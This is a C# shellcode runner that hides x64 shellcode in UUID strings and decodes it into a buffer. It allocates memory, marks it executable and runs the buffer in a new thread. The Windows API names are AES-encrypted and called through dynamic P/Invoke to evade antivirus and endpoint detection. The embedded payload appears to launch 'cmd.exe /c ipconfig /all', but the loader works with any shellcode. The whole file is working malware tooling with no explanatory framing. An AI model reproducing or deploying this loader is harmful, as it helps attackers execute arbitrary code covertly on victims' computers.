using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace UUID_Shellcode_Runner_Dynamic_Invoke
{
    class Program
    {
        static string GlobalKey = "Ei+nZH9rnDeTLKOs01JHymxE9ykrGKKEcHpRj/G6CYE=";
        static string GlobalIV = "TFIXgOFnD1M7rn4p7FH8dg==";

        static byte[] dKernel32_dll_Bytes = new byte[16] { 0x79, 0xD5, 0x72, 0x4B, 0xE9, 0xC2, 0xC2, 0xF4, 0xCF, 0x65, 0xDF, 0x2C, 0x00, 0x5A, 0x12, 0xEF };
        static string dKernel32_dll = DecryptAESAsString(dKernel32_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dWaitForSingleObject_Bytes = new byte[32] { 0x04, 0xE0, 0xA6, 0x89, 0xF2, 0x1C, 0x47, 0x27, 0xB8, 0xC5, 0x72, 0x54, 0xA5, 0x82, 0x30, 0x51, 0x1B, 0x21, 0x0B, 0x05, 0x34, 0x59, 0x79, 0x16, 0x7D, 0xFB, 0x4A, 0x2A, 0xDC, 0xFD, 0xDC, 0xDC };
        static string dWaitForSingleObject = DecryptAESAsString(dWaitForSingleObject_Bytes, GlobalKey, GlobalIV);

        static byte[] dVirtualAlloc_Bytes = new byte[16] { 0x6A, 0xFA, 0x30, 0xB1, 0x08, 0x14, 0xEB, 0xE7, 0x77, 0x0A, 0x64, 0xDA, 0x3D, 0xE6, 0x96, 0x0B };
        static string dVirtualAlloc = DecryptAESAsString(dVirtualAlloc_Bytes, GlobalKey, GlobalIV);

        static byte[] dCreateThread_Bytes = new byte[16] { 0x3E, 0x8A, 0xE9, 0x4C, 0x0E, 0x6B, 0x25, 0x66, 0xD9, 0xE1, 0x9F, 0x44, 0x8A, 0xDB, 0xEE, 0x18 };
        static string dCreateThread = DecryptAESAsString(dCreateThread_Bytes, GlobalKey, GlobalIV);

        static byte[] dVirtualProtect_Bytes = new byte[16] { 0xD1, 0x56, 0xCC, 0x8E, 0x1D, 0x99, 0x18, 0xD8, 0x3C, 0xAD, 0xFA, 0x11, 0x18, 0xA4, 0x53, 0x54 };
        static string dVirtualProtect = DecryptAESAsString(dVirtualProtect_Bytes, GlobalKey, GlobalIV);

        static void Main(string[] args)
        {
            string[] uuids = {

                "e48348fc-e8f0-00c0-0000-415141505251",
                "d2314856-4865-528b-6048-8b5218488b52",
                "728b4820-4850-b70f-4a4a-4d31c94831c0",
                "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
                "48514152-528b-8b20-423c-4801d08b8088",
                "48000000-c085-6774-4801-d0508b481844",
                "4920408b-d001-56e3-48ff-c9418b348848",
                "314dd601-48c9-c031-ac41-c1c90d4101c1",
                "f175e038-034c-244c-0845-39d175d85844",
                "4924408b-d001-4166-8b0c-48448b401c49",
                "8b41d001-8804-0148-d041-5841585e595a",
                "59415841-5a41-8348-ec20-4152ffe05841",
                "8b485a59-e912-ff57-ffff-5d48ba010000",
                "00000000-4800-8d8d-0101-000041ba318b",
                "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
                "c48348d5-3c28-7c06-0a80-fbe07505bb47",
                "6a6f7213-5900-8941-daff-d5636d642e65",
                "2f206578-206b-7069-636f-6e666967202f",
                "006c6c61-9090-9090-9090-909090909090",

            };

            byte[] Warhead = new byte[uuids.Length * 16];
            for (int i = 0; i < uuids.Length; i++)
            {
                Guid guid = Guid.Parse(uuids[i]);
                byte[] guidBytes = guid.ToByteArray();
                Buffer.BlockCopy(guidBytes, 0, Warhead, i * 16, 16);
            }


            int size = Warhead.Length;
            IntPtr Address = fnVirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x04);

            Marshal.Copy(Warhead, 0, Address, size);

            uint oldProtect = 0;
            fnVirtualProtect(Address, (uint)size, 0x20, ref oldProtect);

            uint id = 0;
            IntPtr handleThread = fnCreateThread(0, 0, Address, IntPtr.Zero, 0, ref id);
            fnWaitForSingleObject(handleThread, 0xFFFFFFFF);
        }

        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] arguments, Type[] parameterTypes)
        {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, arguments);
        }

        public static IntPtr fnVirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint) };
            var argumentTypes = new object[] { lpAddress, dwSize, flAllocationType, flProtect };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dVirtualAlloc, argumentTypes, parameterTypes);
        }

        public static bool fnVirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, ref uint lpflOldProtect)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint).MakeByRefType() };
            var argumentTypes = new object[] { lpAddress, dwSize, flNewProtect, lpflOldProtect };
            return (bool)DynamicInvoke(typeof(bool), dKernel32_dll, dVirtualProtect, argumentTypes, parameterTypes);
        }

        public static IntPtr fnCreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId)
        {
            var parameterTypes = new Type[] { typeof(uint), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(uint).MakeByRefType() };
            var argumentTypes = new object[] { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dCreateThread, argumentTypes, parameterTypes);
        }

        public static int fnWaitForSingleObject(IntPtr handle, uint wait)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint) };
            var argumentTypes = new object[] { handle, wait };
            return (int)DynamicInvoke(typeof(int), dKernel32_dll, dWaitForSingleObject, argumentTypes, parameterTypes);
        }

        static string DecryptAESAsString(byte[] data, string keyBase64, string ivBase64)
        {
            byte[] decryptedBytes = DecryptAESAsBytes(data, keyBase64, ivBase64);
            return Encoding.UTF8.GetString(decryptedBytes);
        }

        static byte[] DecryptAESAsBytes(byte[] data, string keyBase64, string ivBase64)
        {
            byte[] key = Convert.FromBase64String(keyBase64);
            byte[] iv = Convert.FromBase64String(ivBase64);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (MemoryStream memoryStream = new MemoryStream(data))
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                {
                    byte[] decryptedBytes = new byte[data.Length];
                    int decryptedByteCount = cryptoStream.Read(decryptedBytes, 0, decryptedBytes.Length);

                    byte[] result = new byte[decryptedByteCount];
                    Array.Copy(decryptedBytes, result, decryptedByteCount);
                    return result;
                }
            }
        }
    }
}
